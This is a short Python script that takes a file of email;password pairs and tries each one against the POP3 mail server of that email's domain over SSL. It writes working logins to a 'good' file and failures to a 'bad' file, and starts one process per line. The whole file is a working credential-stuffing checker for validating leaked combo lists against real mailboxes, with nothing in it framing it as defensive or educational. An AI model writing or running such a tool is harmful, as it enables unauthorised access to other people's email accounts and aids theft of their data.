import re
import poplib
import multiprocessing
from socket import error as socket_error

source_file = open('mail_list')


def check_email(username, password, host, port=995):
    details_string = "%s:%s:%s\n" % (username, password, host)
    try:
        pop3_connection = poplib.POP3_SSL(host, port)
        pop3_connection.user(username)
        pop3_connection.pass_(password)
        good_results = open('good', 'a')
        good_results.write(details_string)
        good_results.close()
    except (poplib.error_proto, socket_error) as e:
        bad_results = open('bad', 'a')
        bad_results.write(details_string)
        bad_results.close()


for line in source_file:
    if len(line) > 10:
        results = re.match('(.+@(.+));(.+)', line)
        process = multiprocessing.Process(target=check_email,
                                          args=(results.group(1), results.group(3), results.group(2)))
        process.start()
